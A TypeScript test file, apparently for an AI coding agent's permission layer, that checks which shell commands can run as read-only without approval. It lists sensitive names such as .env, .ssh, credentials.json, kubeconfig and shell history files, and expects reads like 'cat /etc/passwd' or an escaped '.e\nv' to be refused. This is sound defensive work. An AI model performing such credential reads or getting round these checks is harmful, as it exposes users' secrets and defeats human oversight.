  it('accepts a realpath that stays in scope, including via a real cwd', () => {
    const scope = winScope({
      realpath: (p) =>
        p === 'd:/work/repo' ? 'F:\\real\\repo' : p.replace('d:/work/repo', 'F:/real/repo')
    })
    expectBypass('cat src/a.ts', { scope })
  })

  it('refuses a non-string workdir', () => {
    const v = readOnlyVerdict(
      { toolName: 'bash', input: { command: 'ls', workdir: 3 } },
      winScope()
    )
    expect(v).toEqual({ ok: false, reason: 'input:workdir' })
  })
})

// ── Paths ─────────────────────────────────────────────────────────────────────

describe('sensitive components', () => {
  it('matches exact and glob shapes case-insensitively, never as a free substring', () => {
    for (const c of [
      '.env',
      '.ENV.local',
      'server.PEM',
      'id_ed25519.pub',
      '.bash_history',
      'ConsoleHost_history.txt',
      '.SSH',
      'credentials',
      'credentials.json',
      'secrets.yaml',
      'auth.json',
      'prod.tfvars',
      'kubeconfig',
      '.git',
      '.env. ',
      '.zsh_history',
      '.history',
      '.sh_history',
      '.python_history',
      '.node_repl_history',
      '.psql_history',
      '.mysql_history',
      '.sqlite_history',
      '.lesshst',
      'fish_history',
      'redis_history'
    ]) {
      expect(isSensitiveComponent(c), c).toBe(true)
    }
    for (const c of [
      'AuthVault.ts',
      'auth',
      'vault',
      'environment.ts',
      'secretary.md',
      'keys.ts',
      'git',
      'AutomationRunHistory',
      'history.ts',
      'history',
      'history-status-line.ts'
    ]) {
      expect(isSensitiveComponent(c), c).toBe(false)
    }
  })

  it('checks both views: a PowerShell-spelled path and its bash reading', () => {
    // bash: `.e\nv` → `.env`.
    expectRefuse('cat .e\\nv', {}, 'path:sensitive .env')
  })

  it('every secret sample (derived from the pattern lists) is itself sensitive', () => {
    expect(SENSITIVE_SAMPLES.length).toBeGreaterThan(40)
    for (const sample of SENSITIVE_SAMPLES) expect(isSensitiveComponent(sample), sample).toBe(true)
    // …and a git pathspec glob for each suffix is refused through them.
    expectRefuse('git diff -- "*.pem"', {}, 'path:pattern-may-match-sensitive *.pem')
    expectRefuse('git diff -- "*_history"', {}, 'path:pattern-may-match-sensitive *_history')
    expectRefuse('git diff -- "credentials.*"', {}, /^path:pattern-may-match-sensitive/)
  })

  it('only real history files are sensitive, not history-named sources', () => {
    expectBypass('cat src/components/AutomationRunHistory/index.ts')
    expectBypass('cat src/core/codex/history.ts')
    expectRefuse('cat .zsh_history', {}, 'path:sensitive .zsh_history')
    expectRefuse('cat fish_history', {}, 'path:sensitive fish_history')
  })

  it("checks names below the scope root only, never the root's own ancestors", () => {
    const scope = winScope({ cwd: 'D:\\secrets\\credentials\\ws' })
    expectBypass('ls src', { scope })
    expectBypass('git status', { scope })
    expectBypass('cat "D:\\secrets\\credentials\\ws\\src\\a.ts"', { scope })
    expectBypass('cat /d/secrets/credentials/ws/src/a.ts', {
      scope: posixScope({ cwd: '/d/secrets/credentials/ws' })
    })
    expectBypass('git status', { scope, workdir: 'D:\\secrets\\credentials\\ws\\src' })
    expectRefuse('cat src/secrets/x.txt', { scope }, 'path:sensitive secrets')
    expectRefuse('cat src/.ssh/../a.ts', { scope }, 'path:sensitive .ssh')
    // The same name spelled OUTSIDE the root prefix is still the token's own component.
    expectRefuse('cat ../../credentials/ws/src/a.ts', { scope }, 'path:sensitive credentials')
  })

  it('checks a realpath below its root too', () => {
    const scope = winScope({
      cwd: 'D:\\secrets\\ws',
      realpath: (p) => (p.endsWith('/link.txt') ? 'D:\\secrets\\ws\\.aws\\config' : undefined)
    })
    expectRefuse('cat link.txt', { scope }, 'path:sensitive .aws')
  })

  it('keeps AuthVault.ts-style paths bypassable', () => {
    expectBypass('Get-Content src\\core\\auth\\vault\\AuthVault.ts')
  })
})

describe('POSIX platform', () => {
  it('bypasses in-scope reads and refuses the rest', () => {
    const scope = posixScope()
    expectBypass('cat ./src/a.ts', { scope })
    expectBypass('git log --oneline -5', { scope })
    expectRefuse('cat /etc/passwd', { scope }, 'path:out-of-scope')
    expectRefuse('cat src/../../x', { scope }, 'path:out-of-scope')
    expectRefuse('ls /work/repo2', { scope }, 'path:out-of-scope')
  })

  it('is case-sensitive about scope on POSIX', () => {
    expectRefuse('cat /Work/Repo/a.ts', { scope: posixScope() }, 'path:out-of-scope')
  })

  it('does not fold /d/x onto a drive off Windows', () => {
    expectRefuse('cat /d/work/repo/a.ts', { scope: posixScope() }, 'path:out-of-scope')
  })
})

// ── User rules ────────────────────────────────────────────────────────────────

describe('user rules', () => {
  it('parses Claude rule syntax like parseClaudeRule', () => {
    expect(parseRuleText('Bash(git log:*)')).toEqual({ tool: 'Bash', specifier: 'git log:*' })
    expect(parseRuleText('Bash')).toEqual({ tool: 'Bash' })
    expect(parseRuleText('Bash(*)')).toEqual({ tool: 'Bash' })
    expect(parseRuleText('Read()')).toEqual({ tool: 'Read' })
    expect(parseRuleText('')).toBeNull()
    expect(parseRuleText('(x)')).toBeNull()
  })

  it('a Bash ask rule matching ANY segment refuses (pi only prefix-matches the whole command)', () => {
    const scope = winScope({ rules: { ask: ['Bash(git log:*)'] } })
    expectRefuse('git log --oneline', { scope }, 'rule:Bash Bash(git log:*)')
    expectRefuse('ls; git log --oneline', { scope }, 'rule:Bash Bash(git log:*)')
    expectRefuse('git --no-pager log', { scope }, 'rule:Bash Bash(git log:*)')
    expectRefuse('GIT.exe log', { scope }, 'rule:Bash Bash(git log:*)')
    expectBypass('git status', { scope })
  })

  it('a Bash deny rule refuses; exact and glob forms work', () => {
    expectRefuse(
      'ls -la',
      { scope: winScope({ rules: { deny: ['Bash(ls -la)'] } }) },
      'rule:Bash Bash(ls -la)'
    )
    expectBypass('ls src', { scope: winScope({ rules: { deny: ['Bash(ls -la)'] } }) })
    expectRefuse('git diff --stat', {
      scope: winScope({ rules: { deny: ['Bash(git * --stat)'] } })
    })
    expectRefuse('pwd', { scope: winScope({ rules: { ask: ['Bash'] } }) }, 'rule:Bash Bash')
  })

  it("the rules use ADR-085's matcher: any word order, past global options", () => {
    const scope = winScope({ rules: { ask: ['Bash(git diff --stat:*)'] } })
    expectRefuse('git diff HEAD --stat', { scope }, 'rule:Bash Bash(git diff --stat:*)')
    expectRefuse('git --no-pager diff --stat', { scope }, 'rule:Bash Bash(git diff --stat:*)')
    expectBypass('git diff HEAD', { scope })
  })

  it('allow rules never matter', () => {
    expectRefuse('sed -n 1p x', { scope: winScope({ rules: { allow: ['Bash(sed:*)'] } }) })
  })

  it('a Read deny glob matching the resolved path refuses', () => {
    const scope = winScope({ rules: { deny: ['Read(//**/private/**)', 'Read(docs/internal.md)'] } })
    expectRefuse('cat src/private/notes.txt', { scope }, 'path:read-deny Read(//**/private/**)')
    expectRefuse('ls src\\private', { scope }, 'path:read-deny Read(//**/private/**)')
    expectRefuse(
      'Get-Content docs\\internal.md',
      { scope },
      'path:read-deny Read(docs/internal.md)'
    )
    expectBypass('cat src/public/notes.txt', { scope })
    expectRefuse(
      'cat a.ts',
      { scope: winScope({ rules: { deny: ['Read'] } }) },
      'path:read-deny Read'
    )
  })

  it('a Read deny rule applies to the realpath too', () => {
    const scope = winScope({
      rules: { deny: ['Read(//**/vaulted/**)'] },
      realpath: (p) => (p.endsWith('/link.txt') ? 'D:\\work\\repo\\vaulted\\x.txt' : undefined)
    })
    expectRefuse('cat link.txt', { scope }, 'path:read-deny Read(//**/vaulted/**)')
  })
})

// ── Purity ────────────────────────────────────────────────────────────────────

describe('purity', () => {
  /** Source text with comments removed (the doc comments name the banned modules). */
  const read = (rel: string): string =>
    readFileSync(join(__dirname, '..', rel), 'utf-8')
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/(^|\s)\/\/[^\n]*/g, '$1')
  const importsOf = (src: string): string[] =>
    [...src.matchAll(/^import\s+(type\s+)?[^'"]*from\s+'([^']+)'/gm)].map(
      (m) => `${m[1] ?? ''}${m[2]}`
    )

  it('read-only.ts imports only pure modules and reads no environment', () => {
    const src = read('read-only.ts')
    expect(importsOf(src)).toEqual([
      '../opencode/wildcard',
      '../permissions/shell-rules',
      './shell-strict-lexer',
      './shell-lexical'
    ])
    expect(src).not.toMatch(/node:fs|node:child_process|from 'fs'|child_process|process\.env/)
  })

  it('its imports are pure too (wildcard.ts has only type imports)', () => {
    const lexical = read('shell-lexical.ts')
    expect(importsOf(lexical)).toEqual([])
    expect(lexical).not.toMatch(/process\.env|node:/)
    const wildcard = read('../opencode/wildcard.ts')
    expect(importsOf(wildcard).every((i) => i.startsWith('type '))).toBe(true)
    expect(wildcard).not.toMatch(/process\.env|node:/)
    // The strict lexer is a leaf; ADR-085's rule matcher imports only it (no cycle back here).
    const strictLexer = read('shell-strict-lexer.ts')
    expect(importsOf(strictLexer)).toEqual([])
    expect(strictLexer).not.toMatch(/process\.env|node:/)
    const shellRules = read('../permissions/shell-rules.ts')
    expect(importsOf(shellRules)).toEqual(['../automode/shell-strict-lexer'])
    expect(shellRules).not.toMatch(/process\.env|node:/)
  })
})

// ── ls bundles vs Get-ChildItem parameter prefixes ────────────────────────────

describe('ls bundles', () => {
  const LETTERS = 'alhtrRS1dF'

  it('knows the parameters PowerShell would bind', () => {
    expect(GCI_PARAMETERS).toContain('FollowSymlink')
    expect(bindsGciParameter('fo')).toBe(true)
    expect(bindsGciParameter('ad')).toBe(true)
    expect(bindsGciParameter('LITERAL')).toBe(true)
    expect(bindsGciParameter('la')).toBe(false)
    expect(bindsGciParameter('alh')).toBe(false)
  })

  it('every two-letter GNU bundle passes iff it prefixes no Get-ChildItem parameter', () => {
    let passed = 0
    let refused = 0
    for (const a of LETTERS) {
      for (const b of LETTERS) {
        const token = `-${a}${b}`
        const v = verdict(`ls ${token}`)
        if (bindsGciParameter(`${a}${b}`)) {
          expect(v, token).toEqual({ ok: false, reason: `flag:ls ${token}` })
          refused++
        } else {
          expect(v.ok, token).toBe(true)
          passed++
        }
      }
    }
    // Both directions are exercised (`-ad`, `-ah`, `-ar` bind; `-la` does not).
    expect(passed).toBeGreaterThan(0)
    expect(refused).toBeGreaterThan(0)
  })
})
